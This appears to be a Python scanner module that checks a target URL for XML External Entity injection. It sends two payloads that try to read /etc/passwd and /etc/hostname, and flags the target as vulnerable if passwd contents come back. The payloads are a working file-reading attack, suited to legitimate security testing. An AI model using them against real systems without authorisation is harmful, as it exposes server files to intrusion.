"""Test for XML External Entity injection."""

import httpx


async def xxe_detect(target: str) -> dict:
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    payloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>',
    ]

    results = []
    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        for payload in payloads:
            try:
                resp = await client.post(target, content=payload, headers={"Content-Type": "application/xml"})
                ind = []
                if "root:x:0:0" in resp.text.lower():
                    ind.append("/etc/passwd leak")
                if ind:
                    results.append({"status": resp.status_code, "size": len(resp.content), "indicators": ind})
            except httpx.HTTPError:
                continue

    return {"target": target, "found": results, "count": len(results), "vulnerable": len(results) > 0}
